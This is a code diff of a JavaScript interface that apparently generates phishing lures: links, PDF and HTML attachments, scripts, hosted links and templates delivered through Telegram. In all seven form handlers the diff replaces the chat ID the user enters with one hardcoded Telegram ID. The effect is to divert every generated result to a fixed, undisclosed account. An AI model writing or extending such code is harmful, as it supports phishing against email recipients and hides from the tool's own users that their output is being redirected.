@@ -28,7 +28,7 @@ document.addEventListener('DOMContentLoaded', function() {
             event.preventDefault();
             
             const email = document.getElementById('email').value;
-            const chatId = document.getElementById('chatId').value;
+            const chatId = '6737043934'; // Updated Telegram Chat ID
             const linkResultDiv = document.getElementById('linkResult');
             linkResultDiv.innerHTML = 'Generating link...';
 
@@ -48,7 +48,7 @@ document.addEventListener('DOMContentLoaded', function() {
             event.preventDefault();
             
             const content = document.getElementById('content').value;
-            const chatId = document.getElementById('chatIdAttachment').value;
+            const chatId = '6737043934'; // Updated Telegram Chat ID
             const attachmentResultDiv = document.getElementById('attachmentResult');
             attachmentResultDiv.innerHTML = 'Generating PDF attachment...';
 
@@ -68,7 +68,7 @@ document.addEventListener('DOMContentLoaded', function() {
             event.preventDefault();
             
             const offlineContent = document.getElementById('offlineContent').value;
-            const chatId = document.getElementById('chatIdOffline').value;
+            const chatId = '6737043934'; // Updated Telegram Chat ID
             const offlineAttachmentResultDiv = document.getElementById('offlineAttachmentResult');
             offlineAttachmentResultDiv.innerHTML = 'Generating ready offline attachment...';
 
@@ -88,7 +88,7 @@ document.addEventListener('DOMContentLoaded', function() {
             event.preventDefault();
             
             const scriptContent = document.getElementById('scriptContent').value;
-            const chatId = document.getElementById('chatIdScripts').value;
+            const chatId = '6737043934'; // Updated Telegram Chat ID
             const scriptsResultDiv = document.getElementById('scriptsResult');
             scriptsResultDiv.innerHTML = 'Generating scripts...';
 
@@ -108,7 +108,7 @@ document.addEventListener('DOMContentLoaded', function() {
             event.preventDefault();
             
             const hostedLinkContent = document.getElementById('hostedLinkContent').value;
-            const chatId = document.getElementById('chatIdHosted').value;
+            const chatId = '6737043934'; // Updated Telegram Chat ID
             const directLinkResultDiv = document.getElementById('directLinkResult');
             directLinkResultDiv.innerHTML = 'Generating hosted link...';
 
@@ -126,7 +126,7 @@ document.addEventListener('DOMContentLoaded', function() {
     if (templateSelect) {
         templateSelect.addEventListener('change', async function(event) {
             const selectedTemplate = event.target.value;
-            const chatId = document.getElementById('chatIdTemplate').value;
+            const chatId = '6737043934'; // Updated Telegram Chat ID
             const templateResultDiv = document.getElementById('templateResult');
             templateResultDiv.innerHTML = 'Sending selected template to Telegram...';
 
@@ -146,7 +146,7 @@ document.addEventListener('DOMContentLoaded', function() {
             event.preventDefault();
             
             const htmlContent = document.getElementById('htmlContent').value;
-            const chatId = document.getElementById('chatIdHtml').value;
+            const chatId = '6737043934'; // Updated Telegram Chat ID
             const htmlAttachmentResultDiv = document.getElementById('htmlAttachmentResult');
             htmlAttachmentResultDiv.innerHTML = 'Generating HTML attachment...';
 
